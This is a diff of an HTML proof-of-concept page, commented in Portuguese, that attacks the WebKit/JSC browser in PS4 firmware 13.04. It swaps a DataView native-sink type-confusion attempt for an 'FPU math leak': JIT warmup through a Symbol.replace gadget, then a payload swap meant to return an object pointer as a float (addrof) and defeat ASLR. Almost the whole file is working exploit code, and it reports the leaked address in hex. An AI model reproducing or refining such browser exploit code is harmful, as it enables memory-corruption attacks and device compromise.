@@ -1,34 +1,33 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PoC #4 — Native Sink (DataView Type Confusion)</title>
+<title>PoC #5 — FPU Math Leak (Pointer Washing)</title>
 <style>
   body { font-family: monospace; background: #111; color: #eee; padding: 20px; }
-  h2 { color: #d2f; }
-  pre { background: #1e1e1e; padding: 16px; border-left: 3px solid #d2f; white-space: pre-wrap; }
+  h2 { color: #0df; }
+  pre { background: #1e1e1e; padding: 16px; border-left: 3px solid #0df; white-space: pre-wrap; }
   .ok    { color: #4f4; }
   .alert { color: #f44; font-weight: bold; }
   .info  { color: #aaa; }
   .warn  { color: #fa4; }
-  button { background: #d2f; color: #fff; border: none; padding: 10px 24px;
+  button { background: #0df; color: #000; border: none; padding: 10px 24px;
            font-size: 14px; font-weight: bold; cursor: pointer; margin: 4px; }
   #log { margin-top: 10px; display: block; }
 </style>
 </head>
 <body>
 
-<h2>PoC #4 — Vazamento de Ponteiro via C++ Native Sink</h2>
+<h2>PoC #5 — FPU Math Leak (Pointer Washing)</h2>
 <pre>
 Target   : PS4 Firmware 13.04 — Built-in WebKit/JSC browser
-Estratégia: Contornar os Write Barriers do JS injetando a primitiva de
-            Type Confusion diretamente em uma chamada de API nativa (DataView).
-            O objetivo é forçar o backend C++ a fazer um blind cast do JSValue.
+Estratégia: Contornar todas as barreiras de escrita fazendo o JIT compilar
+            uma operação matemática (ADDSD) diretamente sobre o ponteiro do objeto.
+            O objetivo é "lavar" o ponteiro, transformando-o em um Float válido.
 </pre>
 
-<button onclick="runNativeSinkExploit()">▶ EXECUTAR POC (DataView Sink)</button>
-<pre id="log">Pressione o botão para atacar a API nativa.</pre>
+<button onclick="runMathLeak()">▶ EXECUTAR MATH LEAK</button>
+<pre id="log">Pressione o botão para tentar a lavagem de ponteiro.</pre>
 
 <script>
 var log = document.getElementById('log');
@@ -44,13 +43,12 @@ function alert_(m){ line('alert', '[VULN]  ' + m); }
 function warn(m)  { line('warn',  '[WARN]  ' + m); }
 function sep()    { line('info',  '─'.repeat(60)); }
 
-var WARMUP = 150000; // Warmup altíssimo para garantir FTL (Faster Than Light) JIT
+var WARMUP = 150000; 
 
 function buildGadget(phase, payloadRef) {
   return {
     [Symbol.replace]: function(str) {
       if (phase[0] === 'warmup') return str; 
-      // Payload perfeito encapsulado
       return { length: payloadRef[0] }; 
     }
   };
@@ -60,16 +58,26 @@ function strLen(s, handler) {
   return s.replace(handler, '').length;
 }
 
-// O Sink Nativo.
-// A otimização JIT fará o bind direto para a implementação C++ do setUint32.
-function storeInNative(base, handler, view) {
-  // view.setUint32(byteOffset, value, littleEndian)
-  view.setUint32(0, strLen(base, handler), true);
+// O JIT deve otimizar isso para uma instrução simples de adição de Float (FPU).
+// Não há Write Barriers em matemática simples.
+function mathBypass(base, handler) {
+  var fakeNum = strLen(base, handler);
+  return fakeNum + 0.0;
 }
 
-async function runNativeSinkExploit() {
+function doubleToHex(d) {
+  var buf = new ArrayBuffer(8);
+  var f64 = new Float64Array(buf);
+  var u32 = new Uint32Array(buf);
+  f64[0] = d;
+  var high = u32[1].toString(16).padStart(8, '0');
+  var low = u32[0].toString(16).padStart(8, '0');
+  return "0x" + high + low;
+}
+
+async function runMathLeak() {
   log.textContent = '';
-  info('=== INICIANDO ATAQUE EM SINK NATIVO (C++) ===');
+  info('=== INICIANDO ATAQUE FPU MATH ===');
   sep();
 
   var phase = ['warmup'];
@@ -77,62 +85,56 @@ async function runNativeSinkExploit() {
   var handler = buildGadget(phase, payload);
   var base = 'test string';
 
-  // Buffer de 8 bytes para o DataView
-  var buffer = new ArrayBuffer(8);
-  var dataView = new DataView(buffer);
-
-  info('1. Realizando JIT Warmup Extremo (' + WARMUP + ' iterações)...');
-  info('   Isso força o JIT a linkar a função C++ diretamente.');
+  info('1. JIT Warmup para mathBypass (' + WARMUP + ' iterações)...');
   for (var w = 0; w < WARMUP; w++) {
-    storeInNative(base, handler, dataView);
+    mathBypass(base, handler);
   }
   info('Warmup concluído.');
   
-  var warmupResult = dataView.getUint32(0, true);
-  info('Estado do DataView após warmup: ' + warmupResult);
+  var warmupResult = mathBypass(base, handler);
+  info('Resultado de mathBypass no warmup: ' + warmupResult);
   
   if (warmupResult !== 11) { 
-      warn('Falha no warmup: DataView não recebeu o tamanho da string.');
+      warn('Falha no warmup. Esperava 11, obteve: ' + warmupResult);
       return;
   }
 
   sep();
-  info('2. Iniciando Attack Phase...');
+  info('2. Iniciando Attack Phase (FPU Injection)...');
   
-  var victimObject = { magic: 0x1337BEEF, marker: "LEANDRO_NATIVE" };
+  var victimObject = { magic: 0x1337BEEF, info: "Ponteiro Secreto" };
   payload[0] = victimObject;
   phase[0] = 'attack';
   
+  var leakedResult;
   try {
-    storeInNative(base, handler, dataView);
+    leakedResult = mathBypass(base, handler);
   } catch(e) {
-    warn('O JIT inseriu uma checagem de segurança antes de chamar o C++: ' + e.message);
+    warn('O JIT percebeu a tempo e lançou exceção: ' + e.message);
     return;
   }
   
   phase[0] = 'warmup';
 
   sep();
-  info('3. Inspecionando a Memória Nativa...');
-  
-  // Lendo o que o C++ gravou no nosso ArrayBuffer
-  var leakedLower32 = dataView.getUint32(0, true);
-  var hexLeak = "0x" + leakedLower32.toString(16).padStart(8, '0');
-  
-  info('Valor raw (Uint32) gravado pelo C++: ' + leakedLower32);
+  info('3. Analisando o Retorno...');
+  info('Tipo do resultado: ' + typeof leakedResult);
+  info('Valor do resultado: ' + leakedResult);
 
-  // Análise dos Resultados
-  if (leakedLower32 === 11) {
-      warn('O C++ rejeitou a gravação silenciosamente (manteve o 11).');
-  } else if (leakedLower32 === 0) {
-      warn('O motor nativo executou ToNumber(object) -> NaN -> 0.');
-      warn('O C++ não confiou cegamente no JIT e forçou a coerção segura.');
+  if (typeof leakedResult === 'object') {
+      warn('O tipo continuou sendo "object".');
+      warn('A operação + 0.0 ativou o modo seguro de concatenação/coerção.');
+  } else if (typeof leakedResult === 'string') {
+      warn('A operação + resultou em concatenação de string: ' + leakedResult);
+  } else if (isNaN(leakedResult)) {
+      warn('O motor fez ToNumber() seguro e gerou NaN. Nenhuma FPU raw executada.');
+  } else if (leakedResult === 11) {
+      warn('Falhou silenciosamente. Nenhuma alteração.');
   } else {
+      var leakedHex = doubleToHex(leakedResult);
       alert_('VULNERABILIDADE CRÍTICA CONFIRMADA (ADDROF)!');
-      alert_('O C++ confiou no tipo errado e gravou os bits do ponteiro.');
-      alert_('Lower 32-bits do ponteiro JSValue: ' + hexLeak);
-      info('');
-      info('Se este valor mudar a cada execução do PS4, você tem um bypass de ASLR rodando.');
+      alert_('O FPU "lavou" o nosso objeto e devolveu o ponteiro como número.');
+      alert_('Endereço JSValue vazado: ' + leakedHex);
   }
 }
 </script>
